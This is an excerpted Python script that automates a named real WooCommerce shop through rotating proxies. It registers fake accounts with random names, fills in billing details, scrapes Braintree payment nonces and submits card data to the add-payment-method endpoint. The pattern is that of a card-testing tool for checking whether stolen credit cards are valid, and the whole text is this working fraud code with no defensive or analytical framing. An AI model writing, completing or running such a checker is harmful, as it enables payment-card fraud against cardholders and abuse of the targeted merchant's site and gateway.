...
async def BraintreeWoo(cc, proxyrand):
    ...
    async with aiohttp.ClientSession(connector=conn) as session:
        ...
        try:
            ...
            async with session.get(url='https://gearboxautomotive.com/my-account/', proxy=str(proxyrand), timeout=22) as resp:
                try :          
            ...
            #---------------------------------REQUEST NUMERO 2---------------   ---------------#
            #---------------------------------REQUEST NUMERO 2---------------   ---------------#
            CorreoRand = f"{names.get_first_name()}{names.get_last_name()}{random.randint(100,9999)}@gmail.com"
            data = {
                'username': f"{names.get_first_name()}{names.get_last_name()}{random.randint(100,9999)}",
                'email': CorreoRand,
                'password':'UJhu099s8h8a',
                'woocommerce-register-nonce': noncewoo,
                '_wp_http_referer': '/my-account/',
                'register': 'Register',
            }
            async with session.post('https://gearboxautomotive.com/my-account', data=data, proxy=str(proxyrand), timeout=22) as resp:
                try :          
                    response = await resp.text()
                except (UnboundLocalError):
                    await session.close()
            ...
            #---------------------------------REQUEST NUMERO 4---------------   ---------------#
            #---------------------------------REQUEST NUMERO 4---------------   ---------------#
            async with session.get('https://gearboxautomotive.com/my-account/edit-address/billing', proxy=str(proxyrand), timeout=22) as resp:
                try :
                    response = await resp.text()
                    soup = BeautifulSoup(response , 'lxml')
            ...
            async with session.post('https://gearboxautomotive.com/my-account/edit-address/billing', data=data, proxy=str(proxyrand), timeout=22) as resp:
                try :
                        response = await resp.text()
                except (UnboundLocalError):
                    await session.close()
            ...
            #---------------------------------REQUEST NUMERO 5---------------   ---------------#
            #---------------------------------REQUEST NUMERO 5---------------   ---------------#
            async with session.get('https://gearboxautomotive.com/my-account/add-payment-method/', proxy=str(proxyrand), timeout=22) as resp:
                try :
                    response = await resp.text()
                    soup = BeautifulSoup(response , 'lxml')
                    ...
                    for i in lines:
                        if "window.wc_braintree_credit_card_handler" in i:
                            sucio = i
                            sucio = sucio.replace('window.wc_braintree_credit_card_handler = new WC_Braintree_Credit_Card_Payment_Form_Handler( ',"").replace(' );',"")
                            print(sucio)
            ...
            async with session.post('https://gearboxautomotive.com/wp-admin/admin-ajax.php', data=data, proxy=str(proxyrand), timeout=22) as resp:
                try :
            ...
            data = {
                ...
                "clientSdkMetadata":{
                    "source":"client",
                    "integration":"custom",
                    "sessionId":"558378cd-9838-40ce-ac80-970f30d7fbbf"
                },
            ...
            async with session.post('https://gearboxautomotive.com/my-account/add-payment-method/', data=data, proxy=str(proxyrand), timeout=22) as resp:
                try :
                    response = await resp.text()
                except (UnboundLocalError):
                    await session.close()
